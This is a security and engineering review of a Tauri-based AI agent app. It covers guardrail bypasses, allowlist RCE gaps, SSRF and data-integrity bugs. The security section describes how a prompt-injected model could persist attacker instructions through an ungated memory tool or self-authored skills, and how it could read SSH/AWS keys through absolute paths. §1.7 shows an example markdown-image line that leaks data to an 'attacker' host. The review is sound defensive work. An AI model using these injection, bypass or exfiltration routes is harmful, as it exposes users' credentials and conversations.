# Project Review — Improvement Suggestions

*Date: 2026-07-11. Method: four parallel review passes (stores/UI, core lib, Tauri/security/guardrails, architecture/tests/CI) over the full codebase (~21k lines TS + ~1k lines Rust), findings deduplicated and prioritized. Line numbers are approximate to the working tree at commit `9ba503a` + uncommitted changes.*

## Top priorities (do these first)

1. **Fix guardrail path-blocklist bypass via absolute paths** (§1.1) — sensitive-file protection currently doesn't work.
2. **Close the shell-allowlist RCE holes** (`python file.py`, `npm run`, `find -exec`) (§1.2).
3. **Gate `remember`** — it's a silent, ungated prompt-injection persistence channel (§1.3).
4. **Atomic file writes in Rust** — one small change fixes crash-corruption for every persisted file (§2.1).
5. **Make CI gate reality**: add `bun run build`, `cargo check`/`clippy`/`test`, and coverage (§6.1–6.3).
6. **Fix agent-selection restore bug** — custom agent selection is lost on every app start (§3.1).
7. **Sanitize item names in storage.ts** — UI rename dialog can path-traverse out of app-data (§1.5).
8. **Single tool-event path + selector subscriptions** — the two biggest streaming-performance issues (§4.1, §4.2).

---

## 1. Security & guardrails

The threat model: renderer-side guardrails are the *only* control against a prompt-injected model; the Rust backend trusts the webview entirely. The 2026-06 hardening items (CSP, http wildcard removed, `python -c`/`node -e` blocked, per-segment allowlist, command-substitution block) all still hold — these findings are gaps beyond them.

### 1.1 HIGH — Path blocklist bypassed by absolute paths
`src/lib/guardrails/types.ts:78-92`, `src/lib/guardrails/evaluator.ts:200-202,404-411`
Blocklist patterns are written as `~/.ssh/*`, `~/.aws/*`, etc. and matched against the raw path the model supplies. Passing the absolute form (`/Users/<user>/.ssh/id_rsa`) never matches, and `read_file` is low-risk (no confirmation) → silent read of SSH/AWS/GPG keys.
**Fix:** expand `~`/`$HOME` and canonicalize to absolute before matching; store blocklist patterns in expanded form.

### 1.2 HIGH — Shell allowlist still permits arbitrary code execution
`src/lib/guardrails/types.ts:105-157`, `src/lib/guardrails/evaluator.ts:255-271,413-426`
Allowlist grants `python *`, `node *`, `npm *`, `bun *`, `find *`. Only inline-eval flags are blocked; running a file (`python /tmp/x.py`), script runners (`npm run`, `bunx`), and `find -exec <cmd>` all pass. Combined with `write_file` (one medium confirmation) this is full RCE.
**Fix:** remove general interpreters and `find` from the allowlist (or gate per-invocation); block `-exec`/`-execdir` and script-runner subcommands.

### 1.3 HIGH — `remember` is an ungated prompt-injection persistence channel
`src/lib/tools/memory-tools.ts:39-84`, `src/lib/tools/categories.ts:167`, `src/lib/guardrails/types.ts:74`
`remember` is always offered (even with self-enhancement off), needs no confirmation, and sets `alwaysInclude: true`, so its content is injected into every future system prompt. Untrusted web content → one silent `remember` call → durable attacker-controlled instructions in all future sessions.
**Fix:** require confirmation (at least when `alwaysInclude` is set), previewing the exact persisted text.

### 1.4 HIGH — No filesystem confinement in the Rust layer
`src-tauri/src/commands.rs:224-331,663-681,709-729`
All fs commands accept any path (only `expand_tilde`; no canonicalize, no allowed-root check). Renderer guardrails are the only boundary, and per §1.1 they leak. Any guardrail gap or webview compromise = whole-disk read/write/delete.
**Fix:** canonicalize and confine writes/deletes to an allowed root set (app-data + working dir), rejecting `..`/symlink escapes.

### 1.5 HIGH — Unsanitized item names in storage paths (UI-driven path traversal)
`src/lib/storage.ts:559-574,969-974` (+ delete/rename equivalents)
Agent-facing tools sanitize names (`toolbox-tools.ts:52-62`) but the UI stores don't (`toolbox-store.ts:123,142,184`); Rust `write_file` does `create_dir_all` anywhere. A toolbox item renamed to `../../.zshrc` escapes the storage layout.
**Fix:** move the `isSafeName` check into `saveToolboxItem`/`saveAgent`/`deleteToolboxItem`/`renameToolboxItem` in storage.ts (the chokepoint) and throw on unsafe names.

### 1.6 MEDIUM — SSRF through `scrape_webpage`
`src/lib/tools/web-tools.ts:145-167`, `src-tauri/src/commands.rs:556-621`
Low-risk/no-confirmation GET to any URL; the domain blocklist only lists localhost forms, misses `169.254.169.254`, `[::1]`, decimal/hex IPs, internal hostnames, and runs renderer-side only.
**Fix:** resolve the host and block private/link-local/loopback ranges inside the Rust `http_request` command; deny non-http(s) schemes.

### 1.7 MEDIUM — CSP `img-src https:` is a data-exfiltration channel
`src-tauri/tauri.conf.json:25`
Model output renders as markdown, so `![](https://attacker/?leak=<data>)` exfiltrates conversation content via the image request, bypassing the tight `connect-src`.
**Fix:** restrict `img-src` to `'self' data: blob: asset:`, or proxy/allowlist remote images.

### 1.8 MEDIUM — Self-enhancement enables persistent injection with one confirmation
`src/lib/tools/toolbox-tools.ts:123-192`, `src/lib/tools.ts:377-390`
`write_toolbox_item`/`edit_toolbox_item` author agents/skills/prompts; validation checks structure, not intent. Malicious natural-language instructions surviving one medium confirmation become durable (skills/agents auto-load into future prompts).
**Fix:** make confirmations preview full content and visually flag items that auto-inject into prompts; reconsider the default-on setting.

### 1.9 MEDIUM — Custom `http_request` bypasses the HTTP capability allowlist
`src-tauri/src/commands.rs:556-621`, `src-tauri/capabilities/default.json:10-19`
The `http:default` capability only governs the plugin fetch path; the hand-rolled reqwest command is unconstrained, so capability scoping provides no real egress control.
**Fix:** apply the same host allow/deny list inside `http_request` (pairs with §1.6).

### 1.10 MEDIUM — Guardrails are renderer-only (defense in depth missing)
`src-tauri/src/commands.rs:449-499` (`execute_shell` runs arbitrary `sh -c`)
Every control lives in JS; any renderer compromise yields unrestricted shell + fs + network.
**Fix:** enforce a minimal server-side allowlist/confirmation for `execute_shell`, deletes, and writes outside app-data.

### 1.11 MEDIUM — `env`/`printenv` allowlisted without confirmation
`src/lib/guardrails/types.ts:129-130` — silent dump of all env vars (tokens, proxy creds). Remove from allowlist or confirm.

### 1.12 LOW — Web egress open by default
`src/lib/guardrails/types.ts:94-103` — `defaultPolicy: "allow"` + tiny blocklist. Consider default-deny with a user allowlist, or first-contact confirmation per new domain.

### 1.13 LOW — Autostart/persistence paths not flagged for writes
Writes to `~/Library/LaunchAgents/*.plist`, shell rc files, `~/.config/autostart/*` aren't blocked/elevated (compounded by §1.1). Add these to an expansion-aware high-risk path set.

### 1.14 LOW — `restore_file` has no path validation
`src-tauri/src/commands.rs:663-681` — copies any file to any destination from renderer IPC. Confine both paths to backups dir / app-data.

### 1.15 LOW — Model-authored skill triggers run as regexes every message
`src/lib/skills/resolve-skills.ts:59-72` — with self-enhancement on, a catastrophic-backtracking trigger hangs the renderer each turn; `foo(bar|baz)` also splits incorrectly on `|`. Treat tokens as literals unless they compile, and bound the matched input slice.

---

## 2. Data integrity & durability

The app's core promise is durable local-first data; these findings undermine it.

### 2.1 HIGH — No atomic writes anywhere; crash mid-write corrupts files
`src-tauri/src/commands.rs:232-243` (`write_file`), also `save_config`:700-707, `write_file_base64`:247-261
Every chat, folder.yaml, schedule, memory, and config is written in place. A crash leaves a truncated file which tolerant parsers silently drop (the chat just vanishes from the sidebar).
**Fix:** in `write_file`, write to `<path>.tmp` then `fs::rename` over the target — every caller gets atomicity for free.

### 2.2 HIGH — Read-modify-write races lose updates
- `src/stores/task-store.ts:167-185` (`updateTask`): `playAll` (331-336) runs tasks concurrently; two near-simultaneous completions both load the folder YAML and the second save clobbers the first.
- `src/lib/storage.ts:756-773` (folder rename/pin), `memory-tools.ts:47-75` (two parallel `remember` calls drop a fact), `scheduler-runner.ts:39-57` (tick vs UI edit).
**Fix:** a simple in-process keyed mutex `withFileLock(path, fn)` in storage.ts covers all callers (everything funnels through one renderer process).

### 2.3 HIGH — No versioning/migration story for on-disk formats
`src/lib/storage.ts` — conversations, tasks, schedules, folder-meta are raw `JSON.stringify` with no version field. The pattern exists (settings-store `migrate` at settings-store.ts:396; toolbox-defaults marker at storage.ts:1086-1091) but covers only 2 of ~7 data domains.
**Fix:** stamp `formatVersion` into each persisted document; add a small load-time per-type migration registry.

### 2.4 MEDIUM — In-flight chats not persisted until the stream ends
`src/stores/chat-store.ts:901-909` — a crash during a long agentic run loses the whole exchange. Debounce-save on `iteration_completed`/`thinking_completed`.

### 2.5 MEDIUM — `rename_path`/`renameChat` silently overwrite existing targets
`src/lib/storage.ts:533-538`, `commands.rs:711-729` — `fs::rename` replaces on Unix; renaming a chat onto an existing id destroys the other chat. `renameToolboxItem` (storage.ts:1034-1043) is also non-atomic (save-then-delete). Check target existence and surface an error.

---

## 3. Correctness bugs

### 3.1 HIGH — Custom agent selection lost on every restore
`src/routes/__root.tsx:69-77` — the restore effect runs while `useAgentStore` still holds `DEFAULT_AGENTS` (disk load at agent-store.ts:65 hasn't resolved); a persisted custom agent name fails the membership check, falls back to `agents[0]`, and the effect never re-runs.
**Fix:** gate restore on an `agentsLoaded` flag (or await `loadAgentsFromDisk` first).

### 3.2 HIGH — Silent failure on most disk mutations
chat-store.ts:1176-1279 (several), file-store.ts:423-426 (`saveFile` fails with zero user feedback) — all catch-and-`console.error`. Worse, toolbox-store `create/update/deleteItem` (toolbox-store.ts:107-180) have no catch at all → unhandled rejection and `markOpenItemSaved` never runs.
**Fix:** `toast.error(...)` on all user-initiated mutations (Sonner is already mounted in `__root.tsx:98`).

### 3.3 MEDIUM — Agent-loop failures report success
`src/lib/workflows/run-workflow.ts:133-144`, `src/lib/scheduler-runner.ts:110-119` — loop errors surface as an observed `loop_error` event, not a throw, so a failed workflow step feeds `""` into `{{previous}}` and continues; `executeSchedule` logs "Completed" with `hasError: false`.
**Fix:** return a success/error outcome from `sendMessageToConversation` and check it in both runners.

### 3.4 MEDIUM — `setYolo(false)` doesn't re-enable guardrails
`src/stores/settings-store.ts:183-191` — after a yolo round-trip the toggle shows off but guardrails stay disabled. Make `guardrailsConfig` the single source of truth and derive the legacy booleans (currently hand-synced in five places).

### 3.5 MEDIUM — Tool confirmations routed to the *current* conversation
`src/stores/chat-store.ts:1333-1348` — `confirm/rejectToolExecution` read `currentConversationId`, so a pending confirmation in a conversation the user navigated away from (or a background task/schedule run) goes to the wrong adapter or is dropped. Pass `conversationId` down from the message context.

### 3.6 MEDIUM — `edit_toolbox_item` corrupts content containing `$` patterns
`src/lib/tools/toolbox-tools.ts:179` — `String.replace` with a raw string interprets `$&`, `` $` ``, `$$` in `new_string`. Since uniqueness is enforced, use `.split(old).join(new)` or a replacer function.

### 3.7 MEDIUM — Context trim can't handle a single oversized message
`src/lib/context/trim.ts:63-84` — eviction is whole-message; one giant tool result exceeds the budget alone, the trimmed prompt goes to the provider over budget anyway, and the retry re-hits the same wall.
**Fix:** truncate oversized tool results within kept messages; report `stillOverBudget` in `TrimResult`.

### 3.8 LOW — `getSelectedSchedule` fabricates fallback data
`src/stores/scheduler-store.ts:347-363` — synthesizes a schedule (`agentId: "Assistant"`, empty prompt); if an editor saves from it, the real prompt/agent is overwritten. Return null and lazy-load.

### 3.9 LOW — `updateSchedule` mutates its `updates` parameter
`src/stores/scheduler-store.ts:218-227` — writes `nextRun` onto the caller's object; also shares the RMW race (§2.2). Build a local copy.

### 3.10 LOW — `deleteFolder` leaves selectable ghost conversations
`src/stores/chat-store.ts:1193-1203` — in-memory `conversations` not pruned until the next poll.

### 3.11 LOW — http.ts loopback detection wrong for edge cases
`src/lib/http.ts:28-32` — `startsWith("127.")` matches `127.example.com`; `[::1]` unhandled. Parse and compare properly.

### 3.12 LOW — `loadToolboxItem` fabricates `updatedAt`
`src/lib/storage.ts:991-996` — returns load time, not mtime. Return real mtime from a Rust stat or drop the field.

---

## 4. Performance

### 4.1 HIGH — Every tool event updates conversation state twice
`src/stores/chat-store.ts:611-638` (`syncToolCallToConversation`) and `chat-store.ts:1401-1467` (`subscribeToToolEvents` callback) are near-identical ~40-line implementations, and **both fire for the same event** (once via `onAdapterEvent`, once via agentic-loop-store → `notifyToolStateChange`). Two full conversation-array rebuilds and render passes per event.
**Fix:** extract one shared `applyToolCallUpdate` helper and route tool events through a single path.

### 4.2 HIGH — Whole-store subscriptions cause per-token re-renders
34 components subscribe with no selector. Every `text_delta` replaces the `conversations` array (chat-store.ts:666-671), so ChatSidebar, ChatHeader, AgentSelector, and ChatInput re-render per streamed token; `ToolCallCard` (tool-call-card.tsx:251) isn't memoized so every tool card in the transcript re-renders per token.
**Fix:** convert to selector subscriptions; `React.memo` ToolCallCard and the message row (chat-view.tsx:125-201).

### 4.3 MEDIUM — Sidebar polling fully re-reads and re-parses every chat file every 5s
`src/lib/storage.ts:471-520` (`parseChatEntry` reads + parses the *entire* chat just for title/updatedAt) × N chats × every 5s over Tauri IPC (`use-polling-loader.ts:3`), and `loadChatsFromDisk` (chat-store.ts:1125-1161) unconditionally sets a new array so the whole transcript re-renders even mid-stream.
**Fix:** cache parse results keyed by path+mtime (or keep a per-folder index); skip the store set when an ids+updatedAt fingerprint is unchanged; longer-term, replace polling with Tauri fs-watch.

### 4.4 MEDIUM — System-prompt assembly re-reads the whole Toolbox per message, several times
`resolve-memories.ts:70-83`, `resolve-skills.ts:34-51`, `toolbox-inventory.ts:43-52`, `expand-prompt.ts` — each does its own `listToolboxItems` + per-item load (2 IPC calls each, ×2 with overlay fallback) ⇒ ~3-4 reads per item per message.
**Fix:** shared `loadCategoryItems(category)` in storage.ts with a short-lived cache invalidated by the write paths; also collapses four duplicated `safeList` wrappers.

### 4.5 MEDIUM — Adapters never removed — unbounded growth
`src/stores/agentic-loop-store.ts:158-184` — `removeAdapter` is defined but never called; every conversation ever streamed leaks an adapter, context, and unsubscriber for the app lifetime. Call it from `deleteConversation` and after `loop_completed`/`loop_aborted`.

### 4.6 LOW — Scheduler tick runs schedules serially
`src/lib/scheduler-runner.ts:221-247` — one slow schedule (a full agent run) delays every other due schedule. Since `nextRun` persists before execution, runs can be fire-and-forget or bounded-concurrency.

### 4.7 LOW — Assorted hot-path waste
- `trim.ts:72` re-estimates the whole array per eviction (O(n²)) — keep a running total.
- `tool-history-store.ts:189-279` recomputes filter+sort up to 4× per render — memoize.
- `toolbox-editor.tsx:44-114` re-highlights, re-validates, and splits the whole document per keystroke — debounce ~150ms and key memos on content strings.

---

## 5. Architecture & code health

### 5.1 chat-store.ts and storage.ts are god modules on the hottest paths
`chat-store.ts` (1,486 lines; `streamMessage` alone is a 519-line closure at 411-929) mixes model resolution, system-prompt assembly, streaming, folder CRUD, ghost mode, and tool sync. `storage.ts` (1,107 lines) multiplexes two backends (localStorage VFS / Tauri) across 6+ data domains with no `StorageBackend` interface.
**Fix:** extract (a) `buildSystemPrompt` → `lib/prompts/` (pure, independently testable — also unblocks integration testing, §6.2), (b) model resolution → `lib/models/`, (c) folder CRUD shared with scheduler-store (structurally identical at scheduler-store.ts:120-162); split storage.ts into a backend interface + thin per-domain modules.

### 5.2 Dead code (~450+ lines)
- `components/chat/loop-progress-panel.tsx` (353 lines, imported nowhere) + the agentic-loop-store state that feeds it (iterations/counters, agentic-loop-store.ts:50-58, 276-292, 366-386).
- `tool-history-store.ts:334-346` (`selectRecentRecords`, `selectUniqueAgentIds`).
- `token-estimate.ts:118-123` (`reconcileWithUsage` — designed calibration loop never wired; wire it or delete it).

### 5.3 Duplication
- `startTask`/`redoTask` ~50-line verbatim duplicates (task-store.ts:204-329) — extract `runTask(taskId)`.
- `isSafeName` copy-pasted (toolbox-tools.ts:52-62, memory-tools.ts:22-32); `readErrorMessage` duplicated (speech.ts:31-39, transcription.ts:29-37).
- Two parallel settings-dir overlay mechanisms for memories: storage.ts:905-940 vs resolve-memories.ts:88-104 — the latter is nearly dead code now; keep only the storage-level overlay.

### 5.4 Agent-selection state triplicated
`chat-store.agentId`, `settings-store.selectedAgentId`, `agent-store.selectedAgent` — the last is read by nothing in the chat flow, and agent-store's memory-only CRUD (agent-store.ts:129-150) is overwritten by the next disk load. Drop `selectedAgent` + the memory-only CRUD; keep chat-store.agentId + the persisted mirror.

### 5.5 Misc
- `transcribeAudio` (transcription.ts:40-59) lacks the `AbortSignal` support `synthesizeSpeech` has — recording UI can't cancel an in-flight transcription.
- `models.ts:31-46` hardcodes a stale fallback list (`claude-sonnet-4-20250514` default, deprecated entries); keep it minimal and derive the default from settings.

---

## 6. Testing & CI

### 6.1 HIGH — CI never builds anything and never touches Rust
`.github/workflows/ci.yml` runs install/lint/check-types/test only. `bun run build` (which has broken twice historically — the node-stubs blank-screen saga) and 1,042 lines of security-sensitive Rust merge unverified.
**Fix:** add `bun run build` to the web job; add a Rust job (`cargo check`, ideally `clippy -D warnings` + `fmt --check` + `cargo test`) with `Swatinem/rust-cache`.

### 6.2 HIGH — 2,070 tests, zero integration coverage of the agent loop
Sampled chat-store.test.ts (mocks storage, tools, protocol-parser, message-conversion, and pi-ai wholesale), toolbox-store.test.ts (mocks all storage fns). The critical path — user message → system-prompt assembly → trim → streaming → tool call → guardrail confirm → persistence — is never executed end-to-end; every hop is tested against a mock of the next hop, so contract drift goes undetected (the shiki-mock incident was this class of bug).
**Fix:** one integration suite running `streamMessage` with real storage (localStorage VFS), real conversion/trim/resolvers, and a scripted fake only at the provider boundary; assert the assembled system prompt and persisted conversation.

### 6.3 HIGH — Zero Rust tests for 33 Tauri commands
No `#[cfg(test)]` anywhere in src-tauri. Add unit tests for pure logic (path validation, shell-arg handling, config parsing) and wire `cargo test` into CI. This pairs naturally with §1.4's path-confinement work — write the tests as you add the validation.

### 6.4 MEDIUM — Coverage fully configured but never runs
vitest.config.ts has v8 provider + thresholds (80/75/70) and README advertises them, but no script or CI step invokes `--coverage`. Add `test:coverage` and run it in CI.

### 6.5 MEDIUM — No e2e/desktop smoke test, and `nodeStubsPlugin` makes that risky
vite.config.ts:20-75 turns Node-builtin usage into runtime no-ops that only `console.warn` — exactly the blank-screen failure mode that unit tests and `vite build` can't catch (and which already happened once).
**Fix:** minimal Playwright smoke test against `vite preview` of the production build: assert the chat route renders and fail on any `[node-stub]` console warning.

### 6.6 LOW — Turbo caches `test:run`; a cache hit silently skips tests in CI. `--force` the CI test step or document the tradeoff.

---

## 7. Tooling, dependencies & docs

### 7.1 Lint baseline: 27 of the 58 tolerated warnings are dead-code signal
Breakdown: 17 noUnusedFunctionParameters, 11 useExhaustiveDependencies, 9 noUnusedVariables, 7 noImportantStyles, 5 noAssignInExpressions, rest misc. CI passes at any warning count so new ones accrete silently.
**Fix:** `lint:fix` the unused-code batch, promote `noUnusedVariables`/`noUnusedImports` to error, triage the 11 `useExhaustiveDependencies` individually (they can hide real staleness bugs, e.g. §3.1).

### 7.2 Unused/misplaced dependencies
apps/web: `postcss` (Tailwind v4 uses the Vite plugin), `shadcn` (CLI as runtime dep — use `bunx`), `@hookform/resolvers` (no react-hook-form anywhere), `dotenv` (never imported). Root package.json declares a `dependencies` block though it ships no code. Remove all.

### 7.3 pi versions should live in the workspace catalog
`@earendil-works/pi-agent-core`/`pi-ai` (apps/web) and `pi-coding-agent` (packages/pi-sidecar) are pinned independently; the webview↔sidecar protocol requires them in lockstep. Move to `workspaces.catalog`, reference with `catalog:`.

### 7.4 Turbo pipeline gaps
- turbo.json defines a `lint` task no workspace implements (root runs biome directly) — delete it or route lint through turbo.
- `packages/pi-sidecar` has no `build`/`check-types`/`test` scripts, so `turbo check-types` never type-checks it. Add `check-types` at minimum.

### 7.5 CI hygiene
No bun/turbo caching (cold installs every run); Bun 1.3.6 pinned in both the workflow and `packageManager` (can drift — let setup-bun read `packageManager`).

### 7.6 Docs drift
- **CLAUDE.md references SPEC.md 6+ times as the canonical vision; SPEC.md does not exist in the repo.** Restore/commit it or rewrite the Project Context section. `plan.md` is stale (describes shipped toolbox work as planned) — archive it.
- README roadmap lists Persistent Memory, Voice input, and CI/CD as future work — all shipped. README:22 links pi-mono to the wrong repo (`nicholasgasior` vs `@earendil-works`).
- Tauri version drift: `@tauri-apps/api ^2.9` vs `cli ^2.4` vs plugins ^2.0-2.6 — align minors before the next `tauri build`.

---

## What's in good shape (no action)

- storage.ts overlay precedence rules (canonical wins, deletes remove both copies) are consistently applied.
- trim.ts whole-message granularity correctly preserves tool-call/result pairing; user-first window normalization is right.
- scheduler-runner persisting `nextRun` *before* execution is the correct refire-prevention order.
- The 2026-06 hardening items all still hold (CSP, per-segment shell checks, no http wildcard, gated request logging).
- `MarkdownContent` is properly memoized; settings-store has a real `migrate` path (the model for §2.3).
